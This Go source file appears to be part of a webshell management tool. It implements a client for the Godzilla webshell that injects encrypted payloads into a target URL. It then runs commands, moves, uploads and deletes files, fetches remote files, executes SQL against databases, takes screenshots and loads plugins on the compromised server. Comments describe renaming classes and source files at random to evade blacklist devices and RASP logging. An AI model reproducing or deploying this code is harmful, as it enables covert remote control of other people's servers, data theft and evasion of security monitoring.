package wsm

import (
	"bytes"
	"errors"
	"fmt"
	"github.com/go0p/wsm/lib/dynamic"
	"github.com/go0p/wsm/lib/gzip"
	"github.com/go0p/wsm/lib/httpx"
	"github.com/go0p/wsm/lib/payloads"
	"github.com/go0p/wsm/lib/shell"
	"github.com/go0p/wsm/lib/shell/godzilla"
	"github.com/go0p/wsm/lib/utils"
	"strconv"
	"strings"
)

type GodzillaInfo struct {
	BaseShell
	Key       string
	secretKey []byte
	// 哥斯拉的一些加密模式
	Crypto godzilla.CrypticType
	// 字符编码
	Encoding        string
	encoding        godzilla.EncodingCharset
	ReqLeft         string
	ReqRight        string
	dynamicFuncName map[string]string
}

func (g *GodzillaInfo) setDefaultParams() map[string]string {
	g.dynamicFuncName = make(map[string]string, 2)
	// TODO 添加所有参数
	g.dynamicFuncName["test"] = "test"
	g.dynamicFuncName["getBasicsInfo"] = "getBasicsInfo"
	g.dynamicFuncName["execCommand"] = "execCommand"
	return g.dynamicFuncName
}

func NewGodzillaInfo(g *GodzillaInfo) (*GodzillaInfo, error) {
	err := g.Verify()
	if err != nil {
		return nil, err
	}
	g.secretKey = utils.SecretKey(g.Key)
	g.dynamicFuncName = g.setDefaultParams()

	if len(g.Encoding) == 0 {
		g.Encoding = "utf-8"
	}
	if len(g.Crypto) == 0 {
		return nil, errors.New("未指定加密类型")
	}
	g.encoding = godzilla.EncodingCharset{}
	g.encoding.SetCharset(g.Encoding)
	if g.Headers == nil {
		g.Headers = make(map[string]string, 2)
	}
	g.Headers = g.setHeaders()

	g.Client = httpx.NewClient(g.Proxy, g.Headers, g.Script, g.Crypto)
	return g, nil
}

func (g *GodzillaInfo) setHeaders() map[string]string {
	h := g.Headers
	switch g.Crypto {
	case godzilla.JAVA_AES_BASE64:
		fallthrough
	case godzilla.CSHARP_AES_BASE64:
		fallthrough
	case godzilla.PHP_XOR_BASE64:
		fallthrough
	case godzilla.ASP_XOR_BASE64:
		h["Content-type"] = "application/x-www-form-urlencoded"
	case godzilla.JAVA_AES_RAW:
	case godzilla.CSHARP_AES_RAW:
	case godzilla.PHP_XOR_RAW:
	case godzilla.ASP_XOR_RAW:
	default:
		panic("shell script type error [jsp/jspx/asp/aspx/php]")
	}
	return h
}

func (g *GodzillaInfo) GetPayload() []byte {
	var payload []byte
	if g.Script == shell.JavaScript {
		payload = payloads.GodzillaClassPayload
		// 原始类名被我改为 payloadv4 了
		payload = g.dynamicUpdateClassName("payloadv4", payload)
	} else if g.Script == shell.PhpScript {
		payload = payloads.GodzillaPhpPayload
		r1 := utils.RandomRangeString(5, 50)
		payload = bytes.Replace(payload, []byte("FLAG_STR"), []byte(r1), 1)
	} else if g.Script == shell.CsharpScript {
		payload = payloads.GodzillaCsharpPayload
	} else if g.Script == shell.AspScript {
		payload = payloads.GodzillaAspPayload
		r1 := utils.RandomRangeString(5, 50)
		payload = bytes.Replace(payload, []byte("FLAG_STR"), []byte(r1), 1)
	}
	return payload
}

// EvalFunc 个人简单理解为调用远程 shell 的一个方法，以及对指令的序列化，并且发送指令
func (g *GodzillaInfo) EvalFunc(className, funcName string, parameter *godzilla.Parameter) ([]byte, error) {
	// 填充随机长度，避免 test 请求和 getBasicInfo 请求的长度每次都一样
	r1, r2 := utils.RandomRangeString(10, 100), utils.RandomRangeString(10, 100)
	parameter.AddString(r1, r2)
	if className != "" && len(strings.Trim(className, " ")) > 0 {
		if g.Script == shell.JavaScript {
			parameter.AddString("evalClassName", g.dynamicFuncName[className])
		} else if g.Script == shell.PhpScript || g.Script == shell.AspScript {
			parameter.AddString("codeName", className)
		} else if g.Script == shell.CsharpScript {
			parameter.AddString("evalClassName", className)
		}
	}
	parameter.AddString("methodName", funcName)
	data := parameter.Serialize()
	return g.sendPayload(data)
}

func (g *GodzillaInfo) sendPayload(payload []byte) ([]byte, error) {
	//var enData []byte
	if g.Script == shell.AspScript {
		enData, err := godzilla.Encrypto(payload, g.secretKey, g.Password, g.Crypto, g.Script)
		if err != nil {
			return nil, err
		}
		result, err := g.Client.DoHttpRequest(g.Url, enData)
		if err != nil {
			return nil, err
		}
		deData, err := godzilla.Decrypto(result.RawBody, g.secretKey, g.Password, g.Crypto, g.Script)
		if err != nil {
			return nil, err
		}
		return deData, nil
	} else {
		gzipData, err := gzip.GzipCompress(payload)
		if err != nil {
			return nil, err
		}
		enData, err := godzilla.Encrypto(gzipData, g.secretKey, g.Password, g.Crypto, g.Script)
		if err != nil {
			return nil, err
		}
		result, err := g.Client.DoHttpRequest(g.Url, enData)
		if err != nil {
			return nil, err
		}
		deData, err := godzilla.Decrypto(result.RawBody, g.secretKey, g.Password, g.Crypto, g.Script)
		if err != nil {
			return nil, err
		}
		res, err := gzip.GzipDeCompress(deData)
		if err != nil {
			return nil, err
		}
		return res, nil
	}
}

// 替换为随机包名，用于对抗一些类黑名单机制的设备
// 同时，在 Rasp 日志的堆栈中发现可以看到很明显的 payload.java
// 所以尝试替换一下 SourceFile 为随机，尝试替换一下函数为指定字符串
func (g *GodzillaInfo) dynamicUpdateClassName(oldName string, classContent []byte) []byte {
	fileName := oldName + ".java"
	fakeFileName := utils.RandomRangeString(5, 12) + ".java"

	// 替换 SourceFile Hex值为 : 000C7061796C6F61642E6A617661 / 00 0C payload.java
	classContent = dynamic.ReplaceSourceFile(classContent, fileName, fakeFileName)
	g.dynamicFuncName[fileName] = fakeFileName

	// 替换 execCommand() 函数为 execCommand2() 函数
	classContent = dynamic.ReplaceFuncName(classContent, "execCommand", "execCommand2")
	g.dynamicFuncName["execCommand"] = "execCommand2"

	// 随机替换类名
	newClassName := dynamic.RandomClassName()
	g.dynamicFuncName[oldName] = newClassName
	return dynamic.ReplaceClassName(classContent, oldName, newClassName)
}

func newParameter() *godzilla.Parameter {
	return &godzilla.Parameter{
		HashMap: make(map[string]interface{}, 2),
		Size:    0,
	}
}

// InjectPayload 第一次发送全部的 payload
func (g *GodzillaInfo) InjectPayload() error {
	payload := g.GetPayload()
	encrypt, err := godzilla.Encrypto(payload, g.secretKey, g.Password, g.Crypto, g.Script)
	if err != nil {
		return err
	}
	_, err = g.Client.DoHttpRequest(g.Url, encrypt)
	if err != nil {
		return err
	}
	return nil
}

// 检测 payload 是否正常
func (g *GodzillaInfo) test() (bool, error) {
	parameter := newParameter()
	result, err := g.EvalFunc("", "test", parameter)
	if err != nil {
		return false, err
	}
	if strings.Trim(string(result), " ") == "ok" {
		return true, nil
	} else {
		return false, errors.New(string(result))
	}
}

// 获取基础信息
func (g *GodzillaInfo) getBasicsInfo() ([]byte, error) {
	parameter := newParameter()
	basicsInfo, err := g.EvalFunc("", "getBasicsInfo", parameter)
	if err != nil {
		return nil, err
	}
	//
	//Map pxMap = functions.matcherTwoChild(g.basicsInfo, "(FileRoot|CurrentDir|OsInfo|CurrentUser) : (.+)");
	//g.fileRoot = (String)pxMap.get("FileRoot");
	//g.currentDir = (String)pxMap.get("CurrentDir");
	//g.currentUser = (String)pxMap.get("CurrentUser");
	//g.osInfo = (String)pxMap.get("OsInfo");
	return basicsInfo, nil
}

// 命令执行，这个地方的传参处理好复杂啊，我真的不行了,栓Q =_=!
func (g *GodzillaInfo) execCommand(commandStr string) (string, error) {
	parameter := newParameter()
	// 这个 cmdLine 参数多半是为了兼容 godzilla v3 ?
	cl, err := g.encoding.CharsetEncode(commandStr)
	if err != nil {
		return "", err
	}
	parameter.AddBytes("cmdLine", cl)
	commandArgs := godzilla.SplitArgs(commandStr, 10000, false)
	for i := 0; i < len(commandArgs); i++ {
		encode, err := g.encoding.CharsetEncode(commandArgs[i])
		if err != nil {
			parameter.AddBytes(fmt.Sprintf("arg-%d", i), []byte(commandArgs[i]))
		}
		parameter.AddBytes(fmt.Sprintf("arg-%d", i), encode)
	}

	parameter.AddString("argsCount", strconv.Itoa(len(commandArgs)))

	executableArgs := godzilla.SplitArgs(commandStr, 1, false)
	if len(executableArgs) > 0 {
		parameter.AddString("executableFile", executableArgs[0])
		if len(executableArgs) >= 2 {
			parameter.AddString("executableArgs", executableArgs[1])
		}
	}
	result, err := g.EvalFunc("", g.dynamicFuncName["execCommand"], parameter)
	if err != nil {
		return "", err
	}
	decode, err := g.encoding.CharsetDecode(result)
	if err != nil {
		return "", err
	}
	return decode, nil

}

func (g *GodzillaInfo) getFile(filePath string) (string, error) {
	parameter := newParameter()
	if len(filePath) == 0 {
		filePath = " "
	}
	enFilePath, err := g.encoding.CharsetEncode(filePath)
	if err != nil {
		return "", err
	}
	parameter.AddBytes("dirName", enFilePath)
	res, err := g.EvalFunc("", "getFile", parameter)
	if err != nil {
		return "", err
	}
	decode, err := g.encoding.CharsetDecode(res)
	if err != nil {
		return "", err
	}
	return decode, nil
}

func (g *GodzillaInfo) downloadFile(fileName string) ([]byte, error) {
	parameter := newParameter()
	parameter.AddBytes("fileName", []byte(fileName))
	result, err := g.EvalFunc("", "readFile", parameter)
	if err != nil {
		return nil, err
	}
	return result, nil
}

func (g *GodzillaInfo) uploadFile(fileName string, data []byte) (bool, error) {
	parameter := newParameter()
	parameter.AddBytes("fileName", []byte(fileName))
	parameter.AddBytes("fileValue", data)
	result, err := g.EvalFunc("", "uploadFile", parameter)
	if err != nil {
		return false, err
	}
	stateString := string(result)
	if "ok" == stateString {
		return true, nil
	} else {
		return false, errors.New(stateString)
	}
}

func (g *GodzillaInfo) copyFile(fileName, newFile string) (bool, error) {
	parameter := newParameter()
	parameter.AddBytes("srcFileName", []byte(fileName))
	parameter.AddBytes("destFileName", []byte(newFile))
	result, err := g.EvalFunc("", "copyFile", parameter)
	if err != nil {
		return false, err
	}
	stateString := string(result)
	if "ok" == stateString {
		return true, nil
	} else {
		return false, errors.New(stateString)
	}
}

func (g *GodzillaInfo) deleteFile(fileName string) (bool, error) {
	parameter := newParameter()
	parameter.AddBytes("fileName", []byte(fileName))
	result, err := g.EvalFunc("", "deleteFile", parameter)
	if err != nil {
		return false, err
	}
	stateString := string(result)
	if "ok" == stateString {
		return true, nil
	} else {
		return false, errors.New(stateString)
	}
}

func (g *GodzillaInfo) newFile(fileName string) (bool, error) {
	parameter := newParameter()
	parameter.AddBytes("fileName", []byte(fileName))
	result, err := g.EvalFunc("", "newFile", parameter)
	if err != nil {
		return false, err
	}
	stateString := string(result)
	if "ok" == stateString {
		return true, nil
	} else {
		return false, errors.New(stateString)
	}
}

func (g *GodzillaInfo) moveFile(fileName, newFile string) (bool, error) {
	parameter := newParameter()
	parameter.AddBytes("srcFileName", []byte(fileName))
	parameter.AddBytes("destFileName", []byte(newFile))
	result, err := g.EvalFunc("", "moveFile", parameter)
	if err != nil {
		return false, err
	}
	if "ok" == string(result) {
		return true, nil
	} else {
		return false, errors.New(string(result))
	}
}

func (g *GodzillaInfo) newDir(fileName string) (bool, error) {
	parameter := newParameter()
	parameter.AddBytes("dirName", []byte(fileName))
	result, err := g.EvalFunc("", "newDir", parameter)
	if err != nil {
		return false, err
	}
	stateString := string(result)
	if "ok" == stateString {
		return true, nil
	} else {
		return false, errors.New(stateString)
	}
}

func (g *GodzillaInfo) bigFileUpload(fileName string, position int, content []byte) (string, error) {
	parameter := newParameter()
	parameter.AddBytes("fileContents", content)
	parameter.AddString("fileName", fileName)
	parameter.AddString("position", strconv.Itoa(position))
	result, err := g.EvalFunc("", "bigFileUpload", parameter)
	if err != nil {
		return "", err
	}
	return string(result), nil
}

func (g *GodzillaInfo) bigFileDownload(fileName string, position, readByteNum int) ([]byte, error) {
	parameter := newParameter()
	parameter.AddString("position", strconv.Itoa(position))
	parameter.AddString("readByteNum", strconv.Itoa(readByteNum))
	parameter.AddString("fileName", fileName)
	parameter.AddString("mode", "read")
	res, err := g.EvalFunc("", "bigFileDownload", parameter)
	if err != nil {
		return nil, err
	}
	return res, nil
}
func (g *GodzillaInfo) fileRemoteDown(url, saveFile string) (bool, error) {
	parameter := newParameter()
	parameter.AddBytes("url", []byte(url))
	parameter.AddBytes("saveFile", []byte(saveFile))
	res, err := g.EvalFunc("", "fileRemoteDown", parameter)
	if err != nil {
		return false, err
	}
	result := string(res)
	if "ok" == result {
		return true, nil
	} else {
		return false, errors.New(result)
	}
}

func (g *GodzillaInfo) getFileSize(fileName string) (int, error) {
	parameter := newParameter()
	parameter.AddString("fileName", fileName)
	parameter.AddString("mode", "fileSize")
	result, err := g.EvalFunc("", "bigFileDownload", parameter)
	if err != nil {
		return -1, err
	}
	ret, err := strconv.Atoi(string(result))
	if err != nil {
		return -1, err
	} else {
		return ret, nil
	}
}

func (g *GodzillaInfo) setFileAttr(file, fileType, fileAttr string) (bool, error) {
	parameter := newParameter()
	parameter.AddString("type", fileType)
	parameter.AddBytes("fileName", []byte(file))
	parameter.AddString("attr", fileAttr)
	res, err := g.EvalFunc("", "setFileAttr", parameter)
	if err != nil {
		return false, err
	}
	result := string(res)
	if "ok" == (result) {
		return true, nil
	} else {
		return false, errors.New(result)
	}
}

func (g *GodzillaInfo) execSql(params *godzilla.DBManagerParams) (string, error) {
	parameter := newParameter()
	parameter.AddString("dbType", params.DBType)
	parameter.AddString("dbHost", params.DBHost)
	parameter.AddString("dbPort", strconv.Itoa(params.DBPort))
	parameter.AddString("dbUsername", params.DBUsername)
	parameter.AddString("dbPassword", params.DBPassword)
	parameter.AddString("execType", params.ExecType)
	enSql, err := g.encoding.CharsetEncode(params.ExecSql)
	if err != nil {
		return "", err
	}
	parameter.AddBytes("execSql", enSql)
	if len(params.Option) != 0 {
		dbCharset := params.Option["dbCharset"]
		currentDb := params.Option["currentDb"]
		if len(dbCharset) != 0 {
			parameter.AddString("dbCharset", dbCharset)
			enSql, err := g.encoding.CharsetEncode(params.ExecSql)
			if err != nil {
				return "", err
			}
			parameter.AddBytes("execSql", enSql)
		}
		if len(currentDb) != 0 {
			parameter.AddString("currentDb", currentDb)
		}
	}
	result, err := g.EvalFunc("", "execSql", parameter)
	if err != nil {
		return "", err
	}
	decode, err := g.encoding.CharsetDecode(result)
	if err != nil {
		return "", err
	}
	return decode, nil
}

//func (g *GodzillaInfo) currentDir() string {
//if (this.currentDir != null) {
//return functions.formatDir(this.currentDir);
//} else {
//this.getBasicsInfo();
//return functions.formatDir(this.currentDir);
//}
//}

// Include 远程 shell 加载插件
func (g *GodzillaInfo) Include(codeName string, binCode []byte) (bool, error) {
	parameter := newParameter()
	if g.Script == shell.JavaScript {
		binCode = g.dynamicUpdateClassName(codeName, binCode)
		codeName = g.dynamicFuncName[codeName]
		if codeName != "" {
			parameter.AddString("codeName", codeName)
			parameter.AddBytes("binCode", binCode)
			result, err := g.EvalFunc("", "include", parameter)
			if err != nil {
				return false, err
			}
			resultString := strings.Trim(string(result), " ")
			if resultString == "ok" {
				return true, nil
			} else {
				return false, errors.New(resultString)
			}
		} else {
			return false, errors.New(fmt.Sprintf("类: %s 映射不存在", codeName))
		}
	} else if g.Script == shell.PhpScript {
		parameter.AddString("codeName", codeName)
		parameter.AddBytes("binCode", binCode)
		result, err := g.EvalFunc("", "includeCode", parameter)
		if err != nil {
			return false, err
		}
		resultString := strings.Trim(string(result), " ")
		if resultString == "ok" {
			return true, nil
		} else {
			return false, errors.New(resultString)
		}
	} else if g.Script == shell.CsharpScript {
		parameter.AddString("codeName", codeName)
		parameter.AddBytes("binCode", binCode)
		result, err := g.EvalFunc("", "include", parameter)
		if err != nil {
			return false, err
		}
		resultString := strings.Trim(string(result), " ")
		if resultString == "ok" {
			return true, nil
		} else {
			return false, errors.New(resultString)
		}
	} else {
		return false, nil
	}
}

// 销毁一个会话中的全部数据,这样做的效果有，清除目标服务器上的 sess_PHPSESSID 文件
func (g *GodzillaInfo) close() (bool, error) {
	parameter := newParameter()
	res, err := g.EvalFunc("", "close", parameter)
	if err != nil {
		return false, err
	}
	result := string(res)
	if "ok" == result {
		return true, nil
	} else {
		return false, errors.New(result)
	}
}
func (g *GodzillaInfo) screen() ([]byte, error) {
	parameter := newParameter()
	res, err := g.EvalFunc("", "screen", parameter)
	if err != nil {
		return nil, err
	}
	if len(res) != 0 {
		return res, nil
	}
	return nil, errors.New("response is empty")
}

func (g *GodzillaInfo) Ping(p ...shell.IParams) (bool, error) {
	return g.test()
}

func (g *GodzillaInfo) BasicInfo(p ...shell.IParams) (shell.IResult, error) {
	info, err := g.getBasicsInfo()
	if err != nil {
		return nil, err
	}
	nr := newGResult(info, BasicInfo)
	err = nr.Parser()
	if err != nil {
		return nil, err
	}
	return nr, nil
}

func (g *GodzillaInfo) CommandExec(p shell.IParams) (shell.IResult, error) {
	//params, err := g.processParams(p)
	err := p.SetDefaultAndCheckValue()
	if err != nil {
		return nil, err
	}
	realCommand := p.(*godzilla.ExecParams).RealCommand
	res, err := g.execCommand(realCommand)
	if err != nil {
		return nil, err
	}
	return newGResult([]byte(res), Raw), nil
}

func (g *GodzillaInfo) FileManagement(p shell.IParams) (shell.IResult, error) {
	err := p.SetDefaultAndCheckValue()
	if err != nil {
		return nil, err
	}
	var gRes *gResult
	switch p.(type) {
	case *godzilla.GetFiles:
		filePath := p.(*godzilla.GetFiles).DirName
		res, err := g.getFile(filePath)
		if err != nil {
			return nil, err
		}
		gRes = newGResult([]byte(res), FileOpt)
		err = gRes.Parser()
		if err != nil {
			return nil, err
		}
	case *godzilla.NewDir:
		dirName := p.(*godzilla.NewDir).DirName
		res, err := g.newDir(dirName)
		if err != nil {
			return nil, err
		}
		gRes = newGResult([]byte(strconv.FormatBool(res)), Raw)
		err = gRes.Parser()
		if err != nil {
			return nil, err
		}
	case *godzilla.DownloadFile:
		fileName := p.(*godzilla.DownloadFile).FileName
		res, err := g.downloadFile(fileName)
		if err != nil {
			return nil, err
		}
		gRes = newGResult(res, Raw)
		err = gRes.Parser()
		if err != nil {
			return nil, err
		}
	case *godzilla.UploadFile:
		targetName := p.(*godzilla.UploadFile).FileName
		targetValue := p.(*godzilla.UploadFile).FileValue
		res, err := g.uploadFile(targetName, targetValue)
		if err != nil {
			return nil, err
		}
		gRes = newGResult([]byte(strconv.FormatBool(res)), Raw)
		err = gRes.Parser()
		if err != nil {
			return nil, err
		}
	case *godzilla.CopyFile:
		srcFileName := p.(*godzilla.CopyFile).SrcFileName
		destFileName := p.(*godzilla.CopyFile).DestFileName
		res, err := g.copyFile(srcFileName, destFileName)
		if err != nil {
			return nil, err
		}
		gRes = newGResult([]byte(strconv.FormatBool(res)), Raw)
		err = gRes.Parser()
		if err != nil {
			return nil, err
		}
	case *godzilla.MoveFile:
		mf := p.(*godzilla.MoveFile)
		srcFileName := mf.SrcFileName
		destFileName := mf.DestFileName
		res, err := g.moveFile(srcFileName, destFileName)
		if err != nil {
			return nil, err
		}
		gRes = newGResult([]byte(strconv.FormatBool(res)), Raw)
		err = gRes.Parser()
		if err != nil {
			return nil, err
		}
	case *godzilla.DeleteFile:
		fileName := p.(*godzilla.DeleteFile).FileName
		res, err := g.deleteFile(fileName)
		if err != nil {
			return nil, err
		}
		gRes = newGResult([]byte(strconv.FormatBool(res)), Raw)
		err = gRes.Parser()
		if err != nil {
			return nil, err
		}
	case *godzilla.NewFile:
		fileName := p.(*godzilla.NewFile).FileName
		res, err := g.newFile(fileName)
		if err != nil {
			return nil, err
		}
		gRes = newGResult([]byte(strconv.FormatBool(res)), Raw)
		err = gRes.Parser()
		if err != nil {
			return nil, err
		}
	case *godzilla.BigFileUpload:
		bfu := p.(*godzilla.BigFileUpload)
		fileName := bfu.FileName
		fileContents := bfu.FileContents
		position := bfu.Position
		res, err := g.bigFileUpload(fileName, position, fileContents)
		if err != nil {
			return nil, err
		}
		gRes = newGResult([]byte(res), Raw)
		err = gRes.Parser()
		if err != nil {
			return nil, err
		}
	case *godzilla.BigFileDownload:
		bfd := p.(*godzilla.BigFileDownload)
		fileName := bfd.FileName
		position := bfd.Position
		readByteNum := bfd.ReadByteNum
		res, err := g.bigFileDownload(fileName, position, readByteNum)
		if err != nil {
			return nil, err
		}
		gRes = newGResult(res, Raw)
		err = gRes.Parser()
		if err != nil {
			return nil, err
		}
	case *godzilla.FileRemoteDown:
		frd := p.(*godzilla.FileRemoteDown)
		u := frd.Url
		saveFile := frd.SaveFile
		res, err := g.fileRemoteDown(u, saveFile)
		if err != nil {
			return nil, err
		}
		gRes = newGResult([]byte(strconv.FormatBool(res)), Raw)
		err = gRes.Parser()
		if err != nil {
			return nil, err
		}
	case *godzilla.GetFileSize:
		gf := p.(*godzilla.GetFileSize)
		fileName := gf.FileName
		res, err := g.getFileSize(fileName)
		if err != nil {
			return nil, err
		}
		gRes = newGResult([]byte(strconv.Itoa(res)), Raw)
		err = gRes.Parser()
		if err != nil {
			return nil, err
		}
	case *godzilla.FixFileAttr:
		sfa := p.(*godzilla.FixFileAttr)
		fileName := sfa.FileName
		fileAttr := sfa.FileAttr
		attr := sfa.Attr
		res, err := g.setFileAttr(fileName, string(fileAttr), attr)
		if err != nil {
			return nil, err
		}
		gRes = newGResult([]byte(strconv.FormatBool(res)), Raw)
		err = gRes.Parser()
		if err != nil {
			return nil, err
		}
	}
	return gRes, nil
}

// DatabaseManagement 需要配合 JarLoad 插件加载数据库驱动
func (g *GodzillaInfo) DatabaseManagement(p shell.IParams) (shell.IResult, error) {
	dbmp := p.(*godzilla.DBManagerParams)
	sql, err := g.execSql(dbmp)
	if err != nil {
		return nil, err
	}
	res := newGResult([]byte(sql), Raw)
	err = res.Parser()
	if err != nil {
		return nil, err
	}
	return res, nil
}

func (g *GodzillaInfo) UsePlugins(p godzilla.IPlugins) (shell.IResult, error) {
	p.Inject()
	p.Use()
	return nil, nil
}
